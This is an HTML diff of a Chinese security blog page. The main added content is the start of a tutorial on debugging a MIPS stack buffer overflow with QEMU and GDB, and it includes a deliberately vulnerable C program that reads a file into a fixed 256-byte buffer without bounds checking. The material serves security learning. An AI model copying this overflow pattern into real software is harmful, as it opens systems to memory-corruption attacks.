@@ -70,7 +70,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="IoT,调试,Debug,Mips,溢出," />
 
 
 
@@ -83,12 +83,29 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="TT">
-<meta property="og:url" content="https:&#x2F;&#x2F;blog.pwntools.xyz&#x2F;index.html">
+<meta name="description" content="使用GDB调试MIPS架构的缓冲区溢出环境介绍和准备工作测试的代码都是来自&amp;lt;&amp;lt;解密家用路由器0day挖掘技术&amp;gt;&amp;gt;一书,书上的调试使用的是QEMU + IDA来动态调试,由于最近在学习GDB的调试，所以尝试用QEMU + GDB来调试,权当练手了。 测试使用的代码(下面代码中存在明显的缓冲区溢出漏洞)：">
+<meta name="keywords" content="IoT,调试,Debug,Mips,溢出">
+<meta property="og:type" content="article">
+<meta property="og:title" content="使用GDB调试MIPS架构的缓冲区溢出">
+<meta property="og:url" content="https:&#x2F;&#x2F;blog.pwntools.xyz&#x2F;post&#x2F;43075.html">
 <meta property="og:site_name" content="TT">
+<meta property="og:description" content="使用GDB调试MIPS架构的缓冲区溢出环境介绍和准备工作测试的代码都是来自&amp;lt;&amp;lt;解密家用路由器0day挖掘技术&amp;gt;&amp;gt;一书,书上的调试使用的是QEMU + IDA来动态调试,由于最近在学习GDB的调试，所以尝试用QEMU + GDB来调试,权当练手了。 测试使用的代码(下面代码中存在明显的缓冲区溢出漏洞)：">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;info_1.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;Gdbset.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;info2.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;findoffest.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;gccbreaks.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;return.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;validate.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;ROPfinder.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;ROPchain.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;RAreturn.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;stackinfo.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;result.png">
+<meta property="og:updated_time" content="2019-11-06T08:34:40.553Z">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;info_1.png">
 
 
 
@@ -118,13 +135,13 @@
 
 
 
-  <link rel="canonical" href="https://blog.pwntools.xyz/"/>
+  <link rel="canonical" href="https://blog.pwntools.xyz/post/43075.html"/>
 
 
 
 
 
-  <title>TT</title>
+  <title>使用GDB调试MIPS架构的缓冲区溢出 | TT</title>
   
 
 
@@ -162,8 +179,7 @@
     
   
 
-  <div class="container sidebar-position-left 
-  page-home">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -300,542 +316,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://blog.pwntools.xyz/post/35374.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="TT">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="https://avatars3.githubusercontent.com/u/20963266?s=460&v=4">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="TT">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/post/35374.html" itemprop="url">AFL Fuzzing study notes</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-02T18:18:57+08:00">
-                2019-11-02
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Fuzz/" itemprop="url" rel="index">
-                    <span itemprop="name">Fuzz</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/post/35374.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="post/35374.html" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/post/35374.html" class="leancloud_visitors" data-flag-title="AFL Fuzzing study notes">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h2 id="AFL-Fuzzing-study-notes"><a href="#AFL-Fuzzing-study-notes" class="headerlink" title="AFL Fuzzing study notes"></a>AFL Fuzzing study notes</h2><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>本文采用的测试环境是<code>ubuntu 16.04</code></p>
-<p><code>AFL</code>下载地址: <a href="http://lcamtuf.coredump.cx/afl/" target="_blank" rel="noopener">http://lcamtuf.coredump.cx/afl/</a> </p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf afl-latest.tgz	# 解压代码</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 编译安装</span></span><br><span class="line">cd afl-2.52b</span><br><span class="line">make </span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
-
-<p>不出意外可以直接编译成功,之后在终端输入<code>afl-</code>,按两下<code>tab</code>,会出现一些命令</p>
-<p><img src="http://file.smilehacker.net/1570950620531.png" alt="1570950620531"></p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/post/35374.html#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://blog.pwntools.xyz/post/15454.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="TT">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="https://avatars3.githubusercontent.com/u/20963266?s=460&v=4">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="TT">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/post/15454.html" itemprop="url">DNSRebind测试笔记</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-29T12:40:59+08:00">
-                2019-10-29
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" itemprop="url" rel="index">
-                    <span itemprop="name">漏洞利用</span>
-                  </a>
-                </span>
-
-                
-                
-                  ， 
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/IoT/" itemprop="url" rel="index">
-                    <span itemprop="name">IoT</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/post/15454.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="post/15454.html" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/post/15454.html" class="leancloud_visitors" data-flag-title="DNSRebind测试笔记">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h4 id="DNS-Rebind原理"><a href="#DNS-Rebind原理" class="headerlink" title="DNS_Rebind原理"></a>DNS_Rebind原理</h4><p>为了保证<code>DNS</code>服务的可靠性，<code>DNS</code>响应记录<code>A</code>中包含一个<code>TTL（time to live）</code>值，表示当前解析结果的有效时间，客户端（浏览器）会在超过这个时间值后重新请求解析域名（取决于客户端是否遵循这个TTL值），得到的新响应中又会存在一个过期时间，客户端会再次去解析域名，如此保证获取到最新的域名解析结果。</p>
-<p>若DNS服务前后响应返回的<code>ip</code>地址不一样，浏览器并不会认为跨域。如果域名后续解析到的<code>ip</code>为<code>127.0.0.1</code>、<code>192.168.0.1</code>等不同于先前解析结果，浏览器依然认为符合同源策略，会将请求发送到<code>127.0.0.1</code>机器上。如此就产生了dns rebinding攻击，从而达到绕过同源策略的目的.</p>
-<p>浏览器和操作系统均会存在DNS缓存，缓存时间一般不按照DNS服务器响应中的TTL值。详细见<a href="https://dyn.com/blog/web-browser-dns-caching-bad-thing/" target="_blank" rel="noopener">WEB浏览器缓存问题</a></p>
-<ul>
-<li>chrome为60s左右</li>
-<li>firefox 默认为60s ,可修改</li>
-<li>IE为30min</li>
-</ul>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/post/15454.html#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://blog.pwntools.xyz/post/64819.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="TT">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="https://avatars3.githubusercontent.com/u/20963266?s=460&v=4">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="TT">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/post/64819.html" itemprop="url">Linux PWN</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-28T22:34:38+08:00">
-                2019-10-28
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Pwn/" itemprop="url" rel="index">
-                    <span itemprop="name">Pwn</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/post/64819.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="post/64819.html" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/post/64819.html" class="leancloud_visitors" data-flag-title="Linux PWN">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h2 id="Linux-Pwn"><a href="#Linux-Pwn" class="headerlink" title="Linux Pwn"></a>Linux Pwn</h2><p>之前分析过一些<code>MIPS</code>平台下的二进制，对<code>Linux</code>平台下没怎么研究过。在网上看到一篇文章，写一下总结，比较基础。</p>
-<p>不说原理，只说思路跟解题方法</p>
-<h2 id="一"><a href="#一" class="headerlink" title="一"></a>一</h2><p>下载题目:<a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop/pwn1" target="_blank" rel="noopener">pwn</a></p>
-<p>在分析这道题目之前先使用<a href="https://github.com/slimm609/checksec.sh" target="_blank" rel="noopener"><code>checksec</code></a>查看一下该程序的保护情况:</p>
-<blockquote>
-<p>checksec pwn1</p>
-</blockquote>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/post/64819.html#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
 
   
 
@@ -865,9 +348,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/post/43075.html" itemprop="url">使用GDB调试MIPS架构的缓冲区溢出</a></h1>
+          <h1 class="post-title" itemprop="name headline">使用GDB调试MIPS架构的缓冲区溢出</h1>
         
 
         <div class="post-meta">
@@ -972,378 +453,74 @@
       
 
       
-        
-          <h4 id="使用GDB调试MIPS架构的缓冲区溢出"><a href="#使用GDB调试MIPS架构的缓冲区溢出" class="headerlink" title="使用GDB调试MIPS架构的缓冲区溢出"></a>使用GDB调试MIPS架构的缓冲区溢出</h4><h4 id="环境介绍和准备工作"><a href="#环境介绍和准备工作" class="headerlink" title="环境介绍和准备工作"></a>环境介绍和准备工作</h4><p>测试的代码都是来自&lt;&lt;解密家用路由器0day挖掘技术&gt;&gt;一书,书上的调试使用的是QEMU + IDA来动态调试,由于最近在学习GDB的调试，所以尝试用QEMU + GDB来调试,权当练手了。</p>
+        <h4 id="使用GDB调试MIPS架构的缓冲区溢出"><a href="#使用GDB调试MIPS架构的缓冲区溢出" class="headerlink" title="使用GDB调试MIPS架构的缓冲区溢出"></a>使用GDB调试MIPS架构的缓冲区溢出</h4><h4 id="环境介绍和准备工作"><a href="#环境介绍和准备工作" class="headerlink" title="环境介绍和准备工作"></a>环境介绍和准备工作</h4><p>测试的代码都是来自&lt;&lt;解密家用路由器0day挖掘技术&gt;&gt;一书,书上的调试使用的是QEMU + IDA来动态调试,由于最近在学习GDB的调试，所以尝试用QEMU + GDB来调试,权当练手了。</p>
 <p>测试使用的代码(下面代码中存在明显的缓冲区溢出漏洞)：</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/post/43075.html#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://blog.pwntools.xyz/post/25086.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="TT">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="https://avatars3.githubusercontent.com/u/20963266?s=460&v=4">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="TT">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/post/25086.html" itemprop="url">GDB调试命令--持续更新</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-20T20:50:20+08:00">
-                2019-10-20
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
-                    <span itemprop="name">安全</span>
-                  </a>
-                </span>
-
-                
-                
-                  ， 
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AE%89%E5%85%A8/%E8%B0%83%E8%AF%95/" itemprop="url" rel="index">
-                    <span itemprop="name">调试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/post/25086.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="post/25086.html" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/post/25086.html" class="leancloud_visitors" data-flag-title="GDB调试命令--持续更新">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h2 id="GDB调试命令记录-持续更新"><a href="#GDB调试命令记录-持续更新" class="headerlink" title="GDB调试命令记录(持续更新)"></a>GDB调试命令记录(持续更新)</h2><p>记录一些GDB调试的命令,好记性不如烂笔头</p>
-<h2 id="插件安装"><a href="#插件安装" class="headerlink" title="插件安装"></a>插件安装</h2><p>pwndbg</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>
-
-<p>如果安装了pwndbg,这样可以省调我们很多gdb的命令操作, 运行界面如下</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/post/25086.html#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://blog.pwntools.xyz/post/36656.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="TT">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="https://avatars3.githubusercontent.com/u/20963266?s=460&v=4">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="TT">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/post/36656.html" itemprop="url">IoT测试环境搭建</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-18T22:36:56+08:00">
-                2019-10-18
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
-                    <span itemprop="name">安全</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/post/36656.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="post/36656.html" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/post/36656.html" class="leancloud_visitors" data-flag-title="IoT测试环境搭建">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h2 id="IoT分析环境搭建"><a href="#IoT分析环境搭建" class="headerlink" title="IoT分析环境搭建"></a>IoT分析环境搭建</h2><p>因为之前没有备份的好习惯，好不容易跑起来的虚拟机说没就没，所以写一篇文章，如果以后不小心又搞丢了虚拟机，也可以快速搭建测试环境需要的工具，不需要再次寻找各种资料。</p>
-<h2 id="工具列表"><a href="#工具列表" class="headerlink" title="工具列表:"></a>工具列表:</h2><ul>
-<li>binwalk 固件提取</li>
-<li>qemu 模拟执行</li>
-<li><del>irmadyne 固件模拟工具</del>(这里没有安装)</li>
-<li>buildroot Mips交叉编译环境</li>
-<li>gdb 调试工具(可编译一个<a href="https://blog.csdn.net/zqj6893/article/details/84662579" target="_blank" rel="noopener">mips-linux-gdb</a>)</li>
-<li>IDA</li>
-<li>ghidra</li>
-<li>GDBServer </li>
+<a id="more"></a>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_system</span><span class="params">(<span class="keyword">int</span> code, <span class="keyword">char</span> *cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">255</span>];</span><br><span class="line">    <span class="comment">//sleep(1);</span></span><br><span class="line">    system(cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> fileLen = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">fileData</span>;</span></span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">0</span> == stat(<span class="string">"passwd"</span>, &amp;fileData))</span><br><span class="line">        fileLen = fileData.st_size;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((fp = fopen(<span class="string">"passwd"</span>, <span class="string">"rb"</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Cannot open file passwd! \n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ch = fgetc(fp);</span><br><span class="line">    <span class="keyword">while</span>(count &lt;= fileLen)&#123;</span><br><span class="line">        buf[count++] = ch;</span><br><span class="line">        ch = fgetc(fp);</span><br><span class="line">    &#125;</span><br><span class="line">    buf[--count] = '\x00';</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(buf, <span class="string">"adminpwd"</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        do_system(count, <span class="string">"ls -l"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"you have an invalid password!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>使用mipsls-linux-gcc来编译程序</p>
+<blockquote>
+<p>mipsel-linux-gcc -g crash.c -static -o vuln_system</p>
+</blockquote>
+<ul>
+<li>-g 生成的可执行文件才能用gdb进行源码级调试</li>
+<li>-o 输出文件的名称</li>
+<li>-static 静态编译</li>
 </ul>
-          <!--noindex-->
-          <div class="post-button text-center">
